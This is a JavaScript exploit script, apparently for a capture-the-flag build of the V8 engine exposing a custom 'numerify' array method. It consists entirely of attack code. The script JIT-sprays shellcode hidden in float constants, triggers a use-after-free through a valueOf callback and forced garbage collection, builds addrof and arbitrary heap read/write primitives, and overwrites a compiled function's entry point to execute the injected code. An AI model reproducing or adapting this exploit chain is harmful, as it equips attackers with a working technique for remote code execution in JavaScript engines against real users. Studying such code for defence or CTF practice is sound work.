const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
const bigUint64 = new BigUint64Array(buf);
f2i = (val) => {
    f64[0] = val;
    return bigUint64[0];
}
i2f = (val) => {
    bigUint64[0] = val;
    return f64[0];
}
d2u = (v) => {
    f64[0] = v;
    return Array.from(u32);
}

function u2d(lo, hi) 
{
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex_2(lo, hi) 
{
    if (lo == 0) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if (hi == 0) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

const foo = () => {
    return [
      1.9711828979523134e-246,
      1.9562205631094693e-246,
      1.9557819155246427e-246,
      1.9711824228871598e-246,
      1.971182639857203e-246,
      1.9711829003383248e-246,
      1.9895153920223886e-246,
      1.971182898881177e-246
    ];
}
for (let i = 0; i < 0x40000; i++)
    foo();

let mark_sweep = () => {
    new ArrayBuffer(0x80000000);
}

let scavenge = () => {
    var a = [];
    for (var i = 0; i < 50000; i++) { a[i] = new String(""); }
}

function start() {
    /* Clean up */
    scavenge();
    mark_sweep();
    var result;
    let num = {};
    let idx = 4;
    let victim = new Array(5);
    victim.fill(0x41, 0, idx);
    victim[idx] = num;
    
    num.valueOf = function() {
        console.log("valueOf");
        // %DebugPrint(victim);
        
        /* Shrink victim */
        victim.length = 1;
        scavenge();
        mark_sweep();
        result = [{test:1}]
        for (let i = 0; i < 50; i++) {
            result.push(i);
        }
        // %DebugPrint(result);
        return 0x100000;
    };
    
    victim.numerify();

    return result;
}

let result = start();
var arr = [u2d(0xdeadbeef, 0xdeadbeef)];
result[92] = 0x1337;

var object = {
    "tag": 0xdead,
    "leak": 0xbeef,
};

var fake_obj = new Array(0x10);

addrof = (obj) => {
    object.leak = obj;
    let ret;
    for (let index = 0; index < 1000; index++) {
        // Convert the 64-bit float as 2 32-bit numbers
        let half = d2u(arr[index]);
        if(half[0] == (object.tag << 1)){
            ret = half[1];
            break;
        }
        else if(half[1] == (object.tag << 1)){
            ret = d2u(arr[index + 1])[0];
            break;
        }       
    }
    return BigInt(ret);
}

object.leak = {};
a = addrof(fake_obj);
console.log(a.toString(16));

bigUintArray = new BigUint64Array(6);
bigUintArray[0] = 0x1234n;

let base_pointer_idx;

for (let i = 0; i < 2000; i++) {
    if (f2i(arr[i]) == 0x1234) {
        base_pointer_idx = i + 13;
        break;
    }
}
let prev_data = 0n;
heap_r = (addr) => {
    addr -= 8n;
    arr[base_pointer_idx] = i2f((addr & 0xffffffffn));
    return bigUintArray[0];
}
heap_w = (addr, value) => {
    arr[base_pointer_idx] = i2f((addr & 0xffffffffn));
    // %DebugPrint(bigUintArray);
    bigUintArray[0] = value;
}
dv = new DataView(new ArrayBuffer(0x1000));
dv_addr = addrof(dv);
dv_buffer = heap_r(dv_addr+16n);
console.log((dv_buffer).toString(16));

let code = ((heap_r(addrof(foo) + 0x8n) - 1n) >> 32n) & 0xffffffffn;
let entry = (heap_r(code + 0x14n));
heap_w(code + 0x14n-8n, entry + 0x7fn);
foo();

